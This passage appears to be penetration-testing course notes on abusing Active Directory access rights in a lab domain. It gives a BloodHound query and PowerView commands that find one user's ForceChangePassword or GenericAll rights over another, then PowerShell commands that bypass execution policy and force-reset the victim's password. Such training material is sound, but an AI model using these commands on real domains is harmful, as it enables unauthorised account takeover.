
---
---
## Identifying Vulnerable Accounts

We can use `BloodHound` to identify if we have those access rights. Using a Cypher query, let us search for `Pedro`, and whether he has `ForceChangePassword`, `GenericAll` or `AllExtendedRights` over any account:

```cypher
MATCH p=((n:User {name:"PEDRO@INLANEFREIGHT.LOCAL"})-[r:ForceChangePassword|GenericAll|AllExtendedRights]->(m)) RETURN p
```

![pedro_passwordAttacks.jpg](https://academy.hackthebox.com/storage/modules/219/pedro_passwordAttacks.jpg)

#### Identifying Pedro's Access Rights over Yolanda

```powershell
PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> $userSID = (Get-DomainUser -Identity pedro).objectsid
PS C:\Tools> Get-DomainObjectAcl -Identity yolanda | ?{$_.SecurityIdentifier -eq $userSID}
```

```powershell
Get-DomainObjectAcl -Identity yolanda -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}
```

## Abusing PasswordReset from Windows

> Password Reset with Set-DomainUserPassword

```powershell
Set-DomainUserPassword -Identity yolanda -AccountPassword $((ConvertTo-SecureString 'NewpasswordfromW1' -AsPlainText -Force)) -Verbose
```

> Password Reset with Active Directory Module

```powershell
Import-Module ActiveDirectory
Set-ADAccountPassword yolanda -NewPassword $((ConvertTo-SecureString 'NewpasswordfromW2' -AsPlainText -Force)) -Reset -Verbose
```

---
---
